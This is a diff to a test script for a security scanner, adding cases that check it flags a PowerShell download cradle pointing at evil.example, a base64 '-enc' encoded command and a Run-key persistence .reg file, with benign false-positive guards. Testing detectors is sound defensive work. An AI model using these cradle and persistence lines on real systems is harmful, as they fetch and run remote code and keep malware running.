@@ -743,6 +743,30 @@ rm -rf "$GR_DIR"
     && check "openredir FP guard: same-site subdomain clean" "0" "1" \
     || check "openredir FP guard: same-site subdomain clean" "0" "0"
 
+# F14 script cradle + F15 reg persistence + pyproject.toml PEP621
+SC_DIR=$(mktemp -d)
+printf 'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")' > "$SC_DIR/dl.ps1"
+./hlse_core file "$SC_DIR/dl.ps1" 2>&1 | grep -q "F14" \
+    && check "f14: IEX DownloadString cradle flagged" "0" "0" \
+    || check "f14: IEX DownloadString cradle flagged" "0" "1"
+printf 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' > "$SC_DIR/enc.ps1"
+./hlse_core file "$SC_DIR/enc.ps1" 2>&1 | grep -q "F14" \
+    && check "f14: -enc encoded-command flagged" "0" "0" \
+    || check "f14: -enc encoded-command flagged" "0" "1"
+printf 'Out-File -enc utf8 out.txt\nGet-Content in.txt\n' > "$SC_DIR/benign.ps1"
+./hlse_core file "$SC_DIR/benign.ps1" 2>&1 | grep -q "F14" \
+    && check "f14 FP guard: -enc utf8 (Encoding abbrev) clean" "0" "1" \
+    || check "f14 FP guard: -enc utf8 (Encoding abbrev) clean" "0" "0"
+printf 'Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"Evil"="cmd.exe /c x.bat"\n' > "$SC_DIR/persist.reg"
+./hlse_core file "$SC_DIR/persist.reg" 2>&1 | grep -q "F15" \
+    && check "f15: Run-key .reg flagged" "0" "0" \
+    || check "f15: Run-key .reg flagged" "0" "1"
+printf 'Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\MyApp]\n"Theme"="Dark"\n' > "$SC_DIR/settings.reg"
+./hlse_core file "$SC_DIR/settings.reg" 2>&1 | grep -q "F15" \
+    && check "f15 FP guard: ordinary .reg clean" "0" "1" \
+    || check "f15 FP guard: ordinary .reg clean" "0" "0"
+rm -rf "$SC_DIR"
+
 # Mobile deep-link schemes (sms:/tel:/intent:) — smishing vector
 ./hlse_core 'sms:+19005551234?body=Your%20code%20is%20991' 2>&1 | grep -q "smishing" \
     && check "deeplink: sms: scheme flagged" "0" "0" \
